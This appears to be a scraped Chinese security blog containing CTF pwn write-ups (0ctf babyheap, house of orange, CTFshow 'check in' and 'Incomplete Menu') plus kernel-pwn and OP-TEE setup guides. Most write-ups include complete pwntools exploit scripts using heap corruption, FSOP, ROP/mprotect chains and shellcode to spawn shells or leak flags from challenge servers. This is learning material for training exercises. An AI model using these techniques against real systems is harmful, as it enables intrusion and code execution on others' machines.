{"pages":[{"title":"","text":"# ME # WHOAMI Y1seco Cyberspace Security, Beijing University of Posts and Telecommunications Mail: y1secoa@gmail.com Former Blog：https://blog.csdn.net/qq_45834505 ​ 我以后再也没看到蓝色玫瑰，但知道它在那里就够了。有时夜深人静，我就将水晶花瓶移到窗前，然后背对着它站着，这时我往往能闻到飘渺的花香，就知道它肯定已经在那里了，心灵的眼睛能看清它的每一个细节。我用心来抚摸着它的每一个花瓣，看它在来自窗外的夜风中微微摇曳…… 它是一朵我只能用心来看的花。不过，我还是有希望在此生再用自己的眼睛看到一次蓝色玫瑰，据丁仪说，从量子力学的角度来讲，人的死亡过程就是由一个强观察者变为弱观察者再变为非观察者的过程，当我变成弱观察者时，玫瑰的概率云向毁灭态的坍缩速度就会慢一些，我就有希望看到它。当我走到人生的尽头，当我在弥留之际最后一次睁开眼睛，那时我所有的知性和记忆都消失在过去的深渊中，又回到童年纯真的感觉和梦幻之中，那就是量子玫瑰向我微笑的时候。 ——《三体》","link":"/about/index.html"}],"posts":[{"title":"0ctf2017-babyheap","text":"fastbin attack # 0x01 程序分析 例行检查，64 位程序，保护全开 ida 查看 main 函数，菜单题 sub_D48：对应 Allocate 申请内存地址用来存放结构体，申请内存用的是 calloc sub_E7F：对应编辑 edit，这里没有检查 size ，存在堆溢出 sub_F50: 对应 delete，free 后指针清零不存在 UAF sub_1051 就是 puts 打印 # 0x02 思路 利用 fastbin attack 即 double free 的方式泄露 libc 基址，当只有一个 small/large chunk 被释放时，small/large chunk 的 fd 和 bk 指向 main_arena 中的地址，然后 fastbin attack 可以实现有限的地址写 # 0x03 EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687from pwn import *# p = process(&quot;./0ctf_2017_babyheap&quot;)p=remote(&quot;node4.buuoj.cn&quot;,26060)context.log_level = 'debug'def allo(size): p.recvuntil(&quot;Command: &quot;) p.sendline(str(1)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size))def fill(idx,size,content): p.recvuntil(&quot;Command: &quot;) p.sendline(str(2)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx)) p.recvuntil(&quot;Size: &quot;) p.sendline(str(size)) p.recvuntil(&quot;Content: &quot;) p.sendline(content)def free(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(3)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))def dump(idx): p.recvuntil(&quot;Command: &quot;) p.sendline(str(4)) p.recvuntil(&quot;Index: &quot;) p.sendline(str(idx))allo(0x10)#0allo(0x10)#1allo(0x10)#2allo(0x10)#3allo(0x80)#4free(1)free(2)payload = p64(0)*3 + p64(0x21) + p64(0)*3 + p64(0x21)payload += p8(0x80)fill(0,len(payload),payload)payload = p64(0)*3 + p64(0x21)fill(3,len(payload),payload)allo(0x10)#1 The original position of 2allo(0x10)#2 4 Simultaneous pointingpayload = p64(0)*3 + p64(0x91)fill(3,len(payload),payload)allo(0x80)free(4)dump(2)content = u64(p.recvuntil('\\x7f')[-6:]+'\\x00\\x00')print(hex(content))libc_base = (content) - 0x3c4b78print(hex(libc_base))allo(0x60)free(4)payload = p64(libc_base + 0x3C4AED)fill(2,len(payload),payload)allo(0x60)allo(0x60)# gdb.attach(p)# pause()payload = 'a'*(0x8+0x2+0x8+1)payload += p64(libc_base+0x4526a)fill(6,len(payload),payload)allo(79)# gdb.attach(p)p.interactive() # 0x04 参考文章 https://blog.csdn.net/qq_43935969/article/details/115877748 https://www.cnblogs.com/Rookle/p/12901747.html","link":"/2022/01/14/0ctf_2017_babyheap/"},{"title":"BUUOJ PWN EXERCISE(二)","text":"heap # wustctf2020_easyfast(fastbin attack) 基本 fastbin attack 利用，改 chunk 到 backdoor 地址，将 if 条件中的变量覆盖为 0 拿 shell ## EXP 123456789101112131415161718192021222324252627282930313233343536373839404142from pwn import *# p = process('./wustctf2020_easyfast')p = remote('node4.buuoj.cn',29433)def add(size): p.recvuntil('choice&gt;') p.sendline('1') p.recvuntil('size&gt;') p.sendline(str(size)) def delete(index): p.recvuntil('choice&gt;') p.sendline('2') p.recvuntil('index&gt;') p.sendline(str(index))def edit(idx,content): p.sendlineafter('choice&gt;','3') p.sendlineafter('index&gt;',str(idx)) p.send(content)def backdoor(): p.sendlineafter('choice&gt;','4')add(0x40)add(0x40)delete(0)delete(1)delete(0)edit(0,p64(0x602080))add(0x40)add(0x40)edit(3,p64(0))backdoor()# gdb.attach(p)p.interactive() # starctf_2019_babyshell(syscall) 1234567891011121314#!/usr/bin/env python# coding=utf-8from pwn import *context(log_level = 'debug',os = 'linux',arch = 'amd64')payload = asm(&quot;pop rdi;pop rdi;pop rdi;pop rdx;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;pop rdi;syscall&quot;)# sh = process(&quot;./starctf_2019_babyshell&quot;)sh = remote(&quot;node4.buuoj.cn&quot;,28428)sh.sendlineafter(&quot;plz:\\n&quot;,payload)sh.sendline('a' * 0xc + asm(shellcraft.sh()))sh.interactive() # houseoforange_hitcon_2016(house of orange,frop) # 题目分析 Build the house 即 add 函数，最多只能创建 4 次 chunk edit 其中可以重新输入长度进行堆溢出，最多 edit3 次 因此思路为首先使用 house of orange 释放出 unsorted bin 然后利用 FSOP 劫持程序流 申请一个小的 house，然后把 top chunk 的大小改小 申请一个较大的 house（此时原来的 topchunk 被释放进 unsorted bin），再申请一个 large bin 范围内的 house（切割 unsorted bin），利用该 house 泄露 libc 和堆地址 编辑 house，把剩下 unsorted bin 的 size 改为 0x60，并在其中伪造 _IO_FILE_plus结构体 和 unsorted bin chunk 在这一步中，我们首先利用 unsorted bin attack 修改 _IO_list_all ，这需要把该 chunk 的 bk 改为 _IO_list_all-0x10 再次 malloc，触发错误，获得 shell malloc 时，对 unsorted bin 进行判断，此时该 chunk 的 size 为 0x60，不满足要求，就把该 chunk 放入 small bin，并且向 bk-&gt;fd 写入 main_arena+0x58，即向 _IO_list_all 写入 main_arena+0x58 此时判断下一个 unsorted bin（_IO_list_all） ，而这里实际上没有 chunk，此时会触发错误 此时第一个 _IO_FILE_plus结构体 为 main_arena+0x58 ，而它不满足条件，就通过_chain 调到下一个_ IO_FILE_plus 结构体， _chain 位于 0x68 偏移的地方， main_arena+0x58+0x68=main_arena+0xc0 , 就是 small bin 中 0x60 大小的地方，这就回到了我们伪造的 _IO_FILE_plus结构体 。 # 思路 # 关于 house of orange 核心在于当题目中不存在 free 函数时，通过漏洞利用获得 free 的效果，即在没有 free 函数的情况下得到一个释放的堆块 (unsorted bin)。 这种操作的原理简单来说是当前堆的 top chunk 尺寸不足以满足申请分配的大小的时候，原来的 top chunk 会被释放并被置入 unsorted bin 中，通过这一点可以在没有 free 函数情况下获取到 unsorted bins。 # FSOP 在 libc 的 _IO_list_all 中，存放有一个 _IO_FILE_plus 结构体的指针， 如下图，它指向 _IO_2_1_stderr_ ： 而 _IO_FILE_plus 结构体详细内容如下 其中_chain 指向下一个 _IO_FILE_plus 结构体 在 malloc 中，它调用 malloc_printerr 来打印错误，经过一系列调用，最终来到 _IO_flush_all_lockp ： 1234567891011121314while (fp != NULL){… fp = fp-&gt;_chain; ... if (((fp-&gt;_mode &lt;= 0 &amp;&amp; fp-&gt;_IO_write_ptr &gt; fp-&gt;_IO_write_base)#if defined _LIBC || defined _GLIBCPP_USE_WCHAR_T || (_IO_vtable_offset (fp) == 0 &amp;&amp; fp-&gt;_mode &gt; 0 &amp;&amp; (fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base))#endif ) &amp;&amp; _IO_OVERFLOW (fp, EOF) == EOF) 如果满足以下条件： 123fp-&gt;_mode &gt; 0_IO_vtable_offset (fp) == 0fp-&gt;_wide_data-&gt;_IO_write_ptr &gt; fp-&gt;_wide_data-&gt;_IO_write_base 就会调用 _IO_OVERFLOW，并把结构体当做第一个参数传入 如果我们能够把 _IO_OVERFLOW 改为 system，并且伪造结构体，开头为 /bin/sh，就能获得 shell 了 # EXP 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182from pwn import *from LibcSearcher import *context.log_level = 'debug'# r = remote(&quot;node4.buuoj.cn&quot;, 29155)r= process('houseoforange_hitcon_2016')elf = ELF(&quot;./houseoforange_hitcon_2016&quot;)libc = ELF('./libc-2.23.so')def add(size, content, price, color): r.recvuntil(&quot;Your choice : &quot;) r.sendline('1') r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(size)) r.recvuntil(&quot;Name :&quot;) r.send(content) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) #1-7 r.sendline(str(color))def show(): r.recvuntil(&quot;Your choice : &quot;) r.sendline('2')def edit(size, content, price, color): r.recvuntil(&quot;Your choice : &quot;) r.sendline('3') r.recvuntil(&quot;Length of name :&quot;) r.sendline(str(size)) r.recvuntil(&quot;Name:&quot;) r.send(content) r.recvuntil(&quot;Price of Orange:&quot;) r.sendline(str(price)) r.recvuntil(&quot;Color of Orange:&quot;) #1-7 r.sendline(str(color))add(0x30,'aaaa\\n',0x1234,0xddaa)payload = 'a' * 0x30 +p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0) * 2 + p64(0xf81)edit(len(payload), payload, 666, 0xddaa)add(0x1000, 'a\\n',0x1234, 0xddaa)add(0x400, 'a' * 8, 199, 2)show()r.recvuntil('a'*8)malloc_hook = u64(r.recvuntil('\\x7f').ljust(8, '\\x00')) - 0x668 - 0x10success('malloc_hook = '+hex(malloc_hook))libc.address = malloc_hook - libc.symbols['__malloc_hook']io_list_all = libc.symbols['_IO_list_all']system = libc.symbols['system']payload = 'b' * 0x10edit(0x10, payload, 199, 2)show()r.recvuntil('b'*0x10)heap = u64(r.recvuntil('\\n').strip().ljust(8, '\\x00'))heap_base = heap - 0xE0success('heap = '+hex(heap))#pause()payload = 'a' * 0x400 + p64(0) + p64(0x21) + p32(666) + p32(0xddaa) + p64(0)fake_file = '/bin/sh\\x00'+p64(0x61)#to small binfake_file += p64(0)+p64(io_list_all-0x10)fake_file += p64(0) + p64(1)#_IO_write_base &lt; _IO_write_ptrfake_file = fake_file.ljust(0xc0,'\\x00')fake_file += p64(0) * 3fake_file += p64(heap_base+0x5E8) #vtable ptrfake_file += p64(0) * 2fake_file += p64(system)payload += fake_fileedit(len(payload), payload, 666, 2)#pause()r.recvuntil(&quot;Your choice : &quot;)r.sendline('1')r.interactive() # 参考文章 https://bbs.pediy.com/thread-222718.htm https://www.anquanke.com/post/id/218887#h3-4 https://blog.csdn.net/weixin_44145820/article/details/105270036","link":"/2022/03/03/BUUOJ%20PWN%20EXERCISE(%E4%B8%89%EF%BC%89/"},{"title":"CTFSHOW卷王杯-pwn","text":"根据官方 wp 学习了两道好题 # check in # 思路 发现开了 **sandbox** （之后再仔细分析），然后读入姓名那里有一个明显的格式化字符串漏洞，再之后可以读入 0x90 大小的数据，然而数组大小只有 0x80 ，很明显是一个栈溢出，但是溢出的长度非常短，只有 0x10 ，也就是只能覆盖 rbp 和 ret ，在程序的最后有 close(1) 关闭了标准输出的文件描述符，也就是我们无法泄露任何信息，包括最终得到的 flag ，最后再看下此题的保护：没有开 **Canary** 和 **PIE** 保护。 首先，格式化字符串的利用方式很显然，可以用于泄露 **libc** ：通过泄露 __libc_start_main + 243 ，即可得到 libc_base 。 再来看栈溢出该如何利用，既然我们只能覆盖到 rbp 和 ret ，其中 ret 是跳转执行的地址，那么就可以考虑何处受 rbp 控制，又方便我们利用，不难想到 read 的时候，是将 0x90 的数据读到栈上的，而栈上的地址就受 rbp 控制，由汇编： 123450x4013dd &lt;main+163&gt;: lea rax,[rbp-0x80]0x4013e1 &lt;main+167&gt;: mov edx,0x900x4013e6 &lt;main+172&gt;: mov rsi,rax0x4013e9 &lt;main+175&gt;: mov edi,0x00x4013ee &lt;main+180&gt;: call 0x401100 &lt;read@plt&gt; 可见， read 的第二个参数 rsi （写入数据的地址）就是 rbp-0x80 中的内容，因此，我们可以通过控制 **rbp** 为 **bss** 段上的某地址，然后再通过 **ret** 跳转到 **0x4013dd** 的位置，即可往 **bss** 段上写入内容，再之后通过一个栈迁移，即可跳转到我们读到 bss 段上的 gadget 并执行。 最后，我们来看一下这个 sandbox ，是个黑名单，禁用 socket 那些主要就是为了防止重启输出流造成非预期的，可以先不用管，主要就是发现禁用了 open 的系统调用和 read 相关的系统调用，虽然没有禁 write 相关的系统调用，但是由于有 close(1) ，所以也无法输出，这看似是无法 orw 了，不过仔细分析后可以发现： open 的系统调用虽然被禁用了，但是我们可以用 **openat** 系统调用来代替 **open** 系统调用（ libc 中的 open 函数就是对 openat 这个底层系统调用的封装）， openat 分绝对路径和相对路径两种写法， exp 中都给出了；再来看 read ，注意到 read 相关的系统调用并非全部被禁用了，当 read 的 fd 为 0 时， read 是可用的，对于常规 orw 来说，先 open 一个文件，由于 0,1,2 都分别被标准输入，输出，报错给占用了，所以文件描述符是从 3 开始的，而若是我们在 open 前，先 **close(0)** ，再 **open** 的话，我们打开的文件的描述符就是 **0** 了，我们也就可以 **read** 读取文件内容了；最后，对于 write 来说，可以采用 **“侧信道攻击” 的方式，就是对 flag 的每一位进行爆破，与我们已经 read 读入到内存中的真实 flag 进行比对，比如，若是相等就触发死循环，那么我们就可以通过判断接收数据用了多久来判断猜测是否正确了，在当前假设下，若是超过了 1 秒，则说明我们这一位爆破猜测成功了，当然，我这里写了一个 “二分法” 的版本，不然会耗费很长时间（其实， CTFshow 的 flag 好像用的是 uuid 字符串，也就是 {} 中的内容仅局限于 -0123456789abcdef 这几个字符，因此，应该还能进一步缩短我 exp 的爆破时长）。由于 “侧信道攻击” 最好使用 shellcode 来实现，故在之前需要用 mprotect 的 gadget 链改一下 bss 段的可执行权限，而一次性只能读入 0x80 大小的数据，可能无法将 orw 的 shellcode 和 mprotect 的 gadget 一起读进 bss 段，因此，我们可以先写一小段 ** **shellcode** 作为跳板和 mprotect 的 gadget 一起读入到 bss 段，再通过这个跳板，将 orw 的 shellcode 读到 bss 段上并跳转执行 # EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102from pwn import *context(os = &quot;linux&quot;, arch = &quot;amd64&quot;)possible_list = &quot;-0123456789abcdefghijklmnopqrstuvwxyz{}&quot;elf = ELF(&quot;./checkin&quot;)libc = ELF('./libc-2.30.so')bss_addr = elf.bss() + 0x500read_addr = 0x4013DDleave_addr = 0x401402def pwn(pos, char): io.sendlineafter(b&quot;name :\\n&quot;, b'%25$p') io.recvuntil(b&quot;Hello, &quot;) libc_base = int(io.recv(14)[2:], 16) - 243 - libc.sym['__libc_start_main'] payload = b'\\x00'*0x80 + p64(bss_addr + 0x80) + p64(read_addr) io.sendafter(b&quot;check in :\\n&quot;, payload) shellcode_read = f''' xor rax, rax xor rdi, rdi push {bss_addr+0x100} pop rsi push 0x100 pop rdx syscall jmp rsi ''' pop_rdi_ret = libc_base + 0x26bb2 pop_rsi_ret = libc_base + 0x2709c pop_rdx_r12_ret = libc_base + 0x11c421 mprotect_addr = libc_base + libc.sym['mprotect'] payload = p64(pop_rdi_ret) + p64(bss_addr &amp; 0xfffff000) + p64(pop_rsi_ret) + p64(0x1000) + p64(pop_rdx_r12_ret) + p64(7) + p64(0) + p64(mprotect_addr) payload += p64(bss_addr + len(payload) + 8) + asm(shellcode_read) payload = payload.ljust(0x80, b'\\x00') + p64(bss_addr - 8) + p64(leave_addr) sleep(0.1) io.send(payload) shellcode_main = f''' /* close(0) */ push 3 pop rax xor rdi, rdi syscall /* openat(&quot;/flag&quot;) */ push 257 pop rax /* ( absolute path ) */ mov rsi, 0x67616c662f push rsi mov rsi, rsp /* ( relative path ) push -100 pop rdi push 0x67616c66 push rsp pop rsi */ syscall /* read flag */ xor rax, rax xor rdi, rdi mov rsi, rsp push 0x50 pop rdx syscall /* blow up flag */ mov al, byte ptr[rsi+{pos}] cmp al, {char} ja $-2 ret ''' sleep(0.1) io.send(asm(shellcode_main))if __name__ == '__main__' : start = time.time() pos = 0 flag = &quot;&quot; while True: left, right = 0, len(possible_list)-1 while left &lt; right : mid = (left + right) &gt;&gt; 1 io = remote(&quot;pwn.challenge.ctf.show&quot;, 28102) pwn(pos, ord(possible_list[mid])) s = time.time() io.recv(timeout = 1) t = time.time() io.close() if t - s &gt; 1 : left = mid + 1 else : right = mid flag += possible_list[left] info(flag) if possible_list[left] == '}' : break pos = pos + 1 success(flag) end = time.time() success(&quot;time:\\t&quot; + str(end - start) + &quot;s&quot;) # Incomplete Menu # 思路 这题给出了一个不完整的菜单，只有 new 和 edit ， new 就是新建一个 ** 任意大小（无限制）** 的堆块，最多只可以创建 5 个堆块， edit 可以输入需要读进某堆块中内容的长度 len ，如果输入的长度 len 超过了该堆块的大小 size ，则实际读入长度 Len = size ，否则 Len = len 。漏洞点在于：在将读入内容的最后一字节改为 \\x00 的时候，长度用的是用户输入的长度 len ，而并非实际读入的长度 Len ，这样就会导致某堆块后面的任意某字节会被 “刷零”，不过每个堆块只能被 edit 一次。 没有 show ，不能泄露信息，不过有走 IO 流输出的函数，如 puts 和 printf ，因此容易想到通过劫持 stdout 来进行信息泄露，没有 delete 函数，不能对堆块进行 free ，其实可以通过漏洞改 top chunk 的 size ，将它改小以后（要保证后三位不动），再申请一个大堆块，就能将原先的 top chunk 给 free 调了，不过在这里貌似并没有太大的用处。 我们只有这一个可利用的漏洞，又需要劫持到 stdout ，那就需要知道 stdout 与堆块地址的偏移，对于一般的堆块，其地址与 libc 地址的偏移肯定是无法确定的，但是这题可以申请任意大的堆块，也就是可以通过 mmap 申请堆块，而 **mmap** 申请出来的堆块，是紧接在 **libc** 的上方的，其地址与 **libc** 中地址的偏移是可以确定的，这里可以通过将 **_IO_2_1_stdout_** 的 **_IO_read_end** 和 **_IO_write_base** 的最后一字节都改为 **\\x00** ，这样他们就相等了，也就可以通过走 IO 的输出函数泄露出其中（ _IO_write_base ~ _IO_write_ptr ）包含的 libc 地址，进而得到 libc_base 。 泄露出 libc_base 之后，我们肯定是需要一个 “任意写” 漏洞，劫持一些函数或者 IO 流这些才能完成攻击。不难想到，可以通过劫持 stdin 来实现，这里我们按照和上面类似的方式，修改 **_IO_2_1_stdin_** 的 **_IO_buf_base** 中的最后一字节为 **\\x00** ，这时， _IO_buf_base 正好指向了 _IO_2_1_stdin_ ，而我们读入的时候，用的是 fgets ，这是一个走 IO 流的读入函数（这个函数就是读一整行到 stdin 缓冲区，然后再从缓冲区取出指定长度的数据，因此读数据会被 \\n 截断，或者已经从缓冲区取到了所需长度的数据，也不再会刷新缓冲区往后读取数据了），因此，我们可以通过 fgets 读入任意内容到被伪造的 _IO_buf_base （ _IO_2_1_stdin_ ）处，这样就可以再劫持一次 stdin 进行任意写了，我们读入多少字节到缓冲区， _IO_read_end 就会相应加多少，从缓冲区读取多少字节到目标内存， _IO_read_ptr 就会相应加多少，不过，最多也只能一次性读入 _IO_buf_end - _IO_buf_base 大小的数据到缓冲区，如果还需要读入，则会刷新缓冲区，一次也最多只能读取 _IO_read_end - _IO_read_ptr 大小的合法数据到目标内存，此时，由于 _IO_buf_end 为 _IO_buf_base + 132 ，因此，我们只有读满 **132** 个字节，才有机会按我们第一次劫持 **stdin** 后，读入到 **_IO_buf_base** 中的值（记为 **_IO_buf_base(new)** ）刷新缓冲区，只有刷新完缓冲区之后，才能按照我们的设想进行第二次 **stdin** 的劫持。这里需要注意的是，在第一次完成 stdin 的劫持，读入 132 字节的内容到 _IO_2_1_stdin_ 中之后，会尝试从缓冲区取 16 个字节到目标内存，如果成功取出了 16 个字节，也就满足了 fgets 的需要，那么也就不会刷新缓冲区了，我们也就不能对 stdin 进行第二次劫持了。在这里， glibc 是通过判断 **_IO_read_ptr** 是否小于 **_IO_read_end** 来判断缓冲区中是否还有剩余的数据，因此，我们可以在第一次劫持 stdin 往 _IO_2_1_stdin_ 中写内容的时候，修改其中的 **_IO_read_ptr** 等于 **_IO_read_end** ，这里的 _IO_read_end 是指读完 132 个字节后的值（ _IO_buf_base(new) + 132 ），也就是需要 _IO_read_ptr = _IO_buf_base(new) + 132 ，其实，这里也不一定是要加上 132 ，略小一点，只要保证和 _IO_read_end 差值不足大约 16 个字节，可以有刷新缓冲区的机会即可，并且， glibc 源码中也只是判断了 _IO_read_ptr 是否小于 _IO_read_end ，故还可以将 _IO_read_ptr 改为大于 _IO_read_end ，比如 _IO_read_ptr = _IO_buf_base(new) + 200 也行。在这里，我是通过劫持 **IO_list_all** 来打 **FSOP** 的，通过读取 choice 的 fgets 进行 “任意写” 以后，由于获取到的值并非菜单中的选项 1 或 2 ，就会走到 exit ，直接触发 FSOP 。 # EXP 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960from pwn import *context(arch='amd64', log_level='debug')io = remote(&quot;pwn.challenge.ctf.show&quot;,28121)# io = process('./pwn')elf = ELF('./pwn')libc = ELF(&quot;./libc-2.27.so&quot;)def get_IO_str_jumps(): IO_file_jumps_offset = libc.sym['_IO_file_jumps'] IO_str_underflow_offset = libc.sym['_IO_str_underflow'] for ref_offset in libc.search(p64(IO_str_underflow_offset)): possible_IO_str_jumps_offset = ref_offset - 0x20 if possible_IO_str_jumps_offset &gt; IO_file_jumps_offset: return possible_IO_str_jumps_offsetdef new(size): io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;1&quot;) io.sendlineafter(&quot;&gt;&gt; &quot;, str(size))def edit(index, length, content): io.sendlineafter(&quot;&gt;&gt; &quot;, &quot;2&quot;) io.sendlineafter(&quot;&gt;&gt; &quot;, str(index)) io.sendlineafter(&quot;&gt;&gt; &quot;, str(length)) io.sendafter(&quot;&gt;&gt; &quot;, content)def new_x(size): io.sendline(&quot;1&quot;) sleep(0.1) io.sendline(str(size))def edit_x(index, length, content): io.sendline(&quot;2&quot;) sleep(0.1) io.sendline(str(index)) sleep(0.1) io.sendline(str(length)) sleep(0.1) io.send(content)new(0x200000);edit(0, 0x201000 - 0x10 + libc.sym['_IO_2_1_stdout_'] + 0x10 + 1, '\\n') # _IO_read_endnew_x(0x200000);edit_x(1, 0x201000 * 2 - 0x10 + libc.sym['_IO_2_1_stdout_'] + 0x20 + 1, '\\n') # _IO_write_baselibc_base = u64(io.recvline()[8:16]) - libc.sym['__free_hook'] + 0x38 # _IO_stdfile_2_lock (_IO_2_1_stderr_.file._lock)success(&quot;libc_base:\\t&quot; + hex(libc_base))payload = p64(0)*5 + p64(1) + p64(0) + p64(libc_base + next(libc.search(b'/bin/sh')))payload = payload.ljust(0xd8, b'\\x00') + p64(libc_base + get_IO_str_jumps() - 8)payload += p64(0) + p64(libc_base + libc.sym['system'])new(0x200000);edit(2, 0x201000 * 3 - 0x10 + libc.sym['_IO_2_1_stdin_'] + 0x38 + 1, payload) # _IO_buf_basepayload = p64(0xfbad208b) # _flagspayload += p64(libc_base + libc.sym['_IO_list_all'] + 132) # _IO_read_ptrpayload += p64(libc_base + libc.sym['_IO_list_all']) * 6payload += p64(libc_base + libc.sym['_IO_list_all'] + 0x10) # _IO_buf_endpayload = payload.ljust(132, b'\\x00') + p64(libc_base - (0x201000 * 3 - 0x10))io.sendlineafter(&quot;&gt;&gt; &quot;, payload)io.interactive() # 参考 ctfshow 卷王杯官方 wp","link":"/2022/02/27/CTFSHOW%E5%8D%B7%E7%8E%8B%E6%9D%AF-%20Incomplete%20Menu/"},{"title":"Kernel Pwn 学习（一）","text":"kernel pwn 环境搭建 # 编译内核 首先到 linux 内核官网下载一份内核源代码并解压 选择一个版本下载，我选的是 4.9 [tallball]， 之后安装需要的依赖 12sudo apt-get updatesudo apt-get install git fakeroot build-essential ncurses-dev xz-utils libssl-dev bc 解压源码后进入内核目录，输入命令 sudo make menuconfig 进入内核设置 进入 kernel hacking，检查保证勾选了以下选项 (其实默认都是勾选的，只是进去看一眼而已) Kernel debugging Compile-time checks and compiler options —&gt; Compile the kernel with debug info 和 Compile the kernel with frame pointers KGDB: kernel debugger 保存并退出 sudo make bzImage 生成 bzImage，过程挺久的，完成后在 boot 下生成了一个 bzImage 文件 注: 在过程中可能报错 没有规则可制作目标debian/certs/debian-uefi-certs.pem由certs/x509_certificate_list需求停止 解决方法：在主目录 /usr/src/linux… 中修改.config 文件，去掉上述内容（如果还是不行就修改 linux.4.9 中的.config 对应部分为空 重新编译即可 # 编译 busybox 构建文件系统 在 busybox 官网下载 busybox 文件，最新版的就行 解压后进入目录， make menuconfig ，同样会进入图形界面，在 Settings 上勾选 Build static binary (no shared libs), 然后保存退出 编译，执行 make install ，根目录下会生成一个 _install 文件夹，进入文件夹配置 123456cd _installmkdir procmkdir systouch inittouch packetchmod +x init 编辑 init 文件，用于内核初始化 123456789101112131415#!/bin/shecho &quot;{==DBG==} INIT SCRIPT&quot;mkdir /tmpmount -t proc none /procmount -t sysfs none /sysmount -t debugfs none /sys/kernel/debugmount -t tmpfs none /tmp#mount指令 挂载某个分区到某个文件，这样就将分区与文件建立联系从而访问文件时就可以访问分区。# insmod /xxx.ko # 加载模块# insmod /hello.ko # 加载hello.ko模块mdev -s # We need this to find /dev/sda laterecho -e &quot;{==DBG==} Boot took $(cut -d' ' -f1 /proc/uptime) seconds&quot;setsid /bin/cttyhack setuidgid 1000 /bin/sh #normal user# exec /bin/sh #root 几个常见指令 insmod: 指定模块加载到内核中 rmmod: 从内核中卸载指定模块 lsmod: 列出已经加载的模块 在 packet 中写入，用于将 FileSystem 打包成映像 123#!/bin/shecho &quot;Generate rootfs.img&quot;find . | cpio -o --format=newc &gt; ./rootfs.img 运行 packet 将得到 rootfs.img 文件 # 运行内核 安装 qemu 1234安装QEMU的依赖库sudo apt-get install git libglib2.0-dev libfdt-dev libpixman-1-dev zlib1g-devsudo apt-get install qemu测试输入qemu + tab 如果有很多实例回显，就说明安装成功 之后写一个 shell 脚本启动 qemu, 将前面生成的 bzImage,rootfs.img 一起放到_install 文件夹下，运行 boot.sh，结果如下 如果显示权限不够则 chmod +x boot.sh 并在 root 下运行即可 shell 中参数的含义： 123456789-m 是指定RMA大小(默认384)-kernel 是指定的内核镜像，这里是我们编译的镜像路径，也可以是我们下载好的镜像，如./vmlinuz-4.10.0-1004-gcp-initrd 设置刚刚利用 busybox 创建的 rootfs.img,作为内核启动的文件系统 -append 附加选项，指定no kaslr 可以关闭随机偏移--nographic和console=ttyS0一起使用，启动的界面就变成了当前终端-s 相当于-gdb tcp::1234的简写，可以直接通过主机的gdb远程连接-monitor 配置用户械的网络 // 将监视器重定向主机设备 /dev/null-smp 用于生明所以可能用的cps,ie,socket cores threads = maxcputs.-cpu 设置cpu的安全选项 到这里也说明了为什么 kernel pwn 题目一般都会给出这 3 个文件 .sh ,bzImage,rootfs.cpio ，分别是启动脚本，kernel 镜像以及文件系统映像 一般来说 kernel pwn 里面，漏洞通常是出现在 ko 文件，也就是模块文件，驱动 文件中，而 kernel pwn 的最终目标一般是提权，拿到 root 才能读取 flag # 参考文章 https://blog.csdn.net/qq_40827990/article/details/97036109 https://n0va-scy.github.io/2020/06/21/kernel pwn 环境搭建 /","link":"/2022/02/09/Kernel%20Pwn%E5%AD%A6%E4%B9%A0%EF%BC%88%E4%B8%80%EF%BC%89/"},{"title":"基于QEMU的OPTEE&#x2F;ATF学习","text":"OPTEE/ATF # 环境安装问题 # Ubuntu 20.04, 19.10 or 19.04 出现 libqtgui4 : Depends: libpng12-0 (&gt;= 1.2.13-4) but it is not installed E: Unmet dependencies. Try ‘apt --fix-broken install’ with no packages (or specify a solution). 问题的解决方法： Ubuntu 20.04, 19.10 或者 19.04 中，可以通过 PPA 安装 libpng，安装 PPA 及 libpng12-0 的命令如下。 # 解决方法 123sudo add-apt-repository ppa:linuxuprising/libpng12sudo apt updatesudo apt install libpng12-0 # OPTEE/ATF 环境安装 我的虚拟机是 Ubuntu18.04 # （一）常规流程（比较考验网速） 安装必要依赖 1234567sudo apt-get install android-tools-adb android-tools-fastboot autoconf \\ automake bc bison build-essential cscope curl device-tree-compiler \\ expect flex ftp-upload gdisk iasl libattr1-dev libc6:i386 libcap-dev \\ libfdt-dev libftdi-dev libglib2.0-dev libhidapi-dev libncurses5-dev \\ libpixman-1-dev libssl-dev libstdc++6:i386 libtool libz1:i386 make \\ mtools netcat python-crypto python-serial python-wand unzip uuid-dev \\ xdg-utils xterm xz-utils zlib1g-dev 创建 opentee 目录 1234mkdir open-tee //创建目录cd open-tee //切换到创建的目录repo init -u https://github.com/OP-TEE/manifest.git -m default_stable.xml --repo-url=https://mirrors.tuna.tsinghua.edu.cn/git/git-repo/ -b 2.6.0 //初始化repo,使用清华的repo减少一些麻烦 打开.repo/manifest.xml，在 revision 后添加 clone-depth=“1”，因为一些 linux project,qemu project 太大，只克隆一层 1time repo sync -j8 -f 获取 toolchain 12cd build //切换到build目录make -f toolchain.mk toolchains //下载toolchain 开始编译使用 qemu 运行 OP-TEE 的工程 准备好 toolchain 和 source code 之后，下一步就是编译工程，具体操作如下： 12cd build //切换到build目录make -f qemu.mk all //编译工程 启动 qemu 12cd buildmake -f qemu.mk run-only 运行 OP-TEE 和 linux 在 qemu 界面中输入字母 “c” 回车之后，就会启动两个 terminal，一个是 OP-TEE 的 terminal, 另外一个是 linux 的 terminal。 # （二）使用搭建好的的 optee https://blog.csdn.net/chelseablue1905/article/details/85344941 注意在 build_qemu.sh 时会报错， 1builddir/build/BUILD/qemu-2.11.0-rc1/util/memfd.c:40:12: error: static declaration of memfd_create follows non-static declaration 按照发布的补丁：https://git.qemu.org/?p=qemu.git;a=commit;h=75e5b70e6b5dcc4f2219992d7cffa462aa406af0 删除 